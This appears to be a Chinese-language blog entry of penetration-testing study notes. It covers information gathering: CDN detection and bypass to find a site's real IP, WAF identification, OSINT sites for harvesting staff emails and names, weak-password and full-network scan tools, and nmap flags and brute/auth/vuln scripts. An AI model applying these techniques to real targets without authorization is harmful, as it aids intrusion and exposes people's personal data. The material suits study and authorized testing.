        <content type="html"><![CDATA[<h1 id="信息收集概要"><a href="#信息收集概要" class="headerlink" title="信息收集概要"></a>信息收集概要</h1><p>whois收集网站管理信息例如邮箱</p><p>查看网站是否有CDN</p><p>查看网站cms（指纹）</p><p>网站旁段、c段</p><p>CDN绕过</p><h2 id="判断网站是否存在CDN"><a href="#判断网站是否存在CDN" class="headerlink" title="判断网站是否存在CDN"></a>判断网站是否存在CDN</h2><p>全球ping</p><p>cdm命令行指令：nslookup</p><h2 id="CDN的绕过方法"><a href="#CDN的绕过方法" class="headerlink" title="CDN的绕过方法"></a>CDN的绕过方法</h2><p>邮件查询。可以通过对方发送的邮件查看对方真实ip</p><p>使用国外ip ping目标网址</p><p>子域名一般没有CDN。通过子域名查询可查询真实ip</p><p>小程序一般没有CDN</p><p>DNS历史解析。目标网站在创建时可能未使用CDN（微步在线）</p><p>暗黑引擎搜索（html源代码标签）</p><p>敏感文件查找。敏感文件可能会记录目标网站的真实ip地址或绝对路径，通过查找目标网站相关的敏感文件（探针、phpinfo.php）可获取真实ip地址</p><p>全网扫描（工具）</p><p><a href="https://anonymousemail.me/">https://anonymousemail.me</a> 匿名邮箱</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a> 微步在线</p><p><a href="http://www.fofa.info/">www.fofa.info</a> 暗黑引擎</p><p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a> 全网扫描工具（易语言）</p><p><a href="https://www.lanzous.com/iao7mh">https://www.lanzous.com/iao7mh</a>  全网扫描工具（python2）</p><p>奇安信鹰途</p><p>shandan</p><p>钟馗之眼</p><h2 id="waf识别工具"><a href="#waf识别工具" class="headerlink" title="waf识别工具"></a>waf识别工具</h2><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><h1 id="app服务端漏洞"><a href="#app服务端漏洞" class="headerlink" title="app服务端漏洞"></a>app服务端漏洞</h1><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>dex2jar、Androidkiller</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h1 id="信息收集重点"><a href="#信息收集重点" class="headerlink" title="信息收集重点"></a>信息收集重点</h1><p><a href="https://www.tianyacha.com/">https://www.tianyacha.com</a> 天眼查</p><p><a href="https://www.qichacha.com/">https://www.qichacha.com</a> 企查查</p><p><a href="https://www.reg007.com/">https://www.reg007.com</a> 注册过的网站查询</p><p><a href="https://www.email-format.com/i/search">https://www.email-format.com/i/search</a> 在线邮箱查询</p><p><a href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 在线汉字转拼音（制作字典）</p><p><a href="https://github.com/shack2/SNETracke/releases">https://github.com/shack2/SNETracke/releases</a> 超级弱口令工具</p><p><a href="https://anymousemail.me/">https://anymousemail.me</a> 匿名邮箱</p><p>Maltego 网站资产结构、员工手机号、邮箱</p><p>招聘网</p><p>支付宝根据QQ邮箱查姓名</p><p>js信息收集 相关脚本：<a href="https://github.com/Threezhl/JSFinder">https://github.com/Threezhl/JSFinder</a>  爬取网站js文件，提取url、子域名</p><h1 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h1><p>了解常见端口号及其对应端口服务作为使用nmap的前置知识</p><h2 id="nmap用途"><a href="#nmap用途" class="headerlink" title="nmap用途"></a>nmap用途</h2><p>发现网络上的主机；端口扫描；os检测；软件脚本检测脆弱性的漏洞</p><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><p>-sP：进行ping扫描，扫描网段存活机器</p><p><strong>-sS： syn扫描也叫半开放扫描，不会产生会话，对方难以发现</strong> </p><p> -sT： 三次握手扫描，容易被发现，基本不用</p><p>-sV： 扫描目标端口开放的服务版本</p><p>-O： 识别目标操作系统版本</p><p>-A： os识别，版本探测，附带脚本和综合扫描</p><p><strong>-Pn -A： 绕过防火墙进行全面扫描</strong></p><p>-T(1-6)：扫描线程，数字越大越快</p><h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><p>auth：处理鉴权证书（绕开鉴权）检测弱口令</p><p>brute：暴力破解</p><p>vuln：检测是否存在常见漏洞</p><p>脚本使用：-script 脚本名</p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
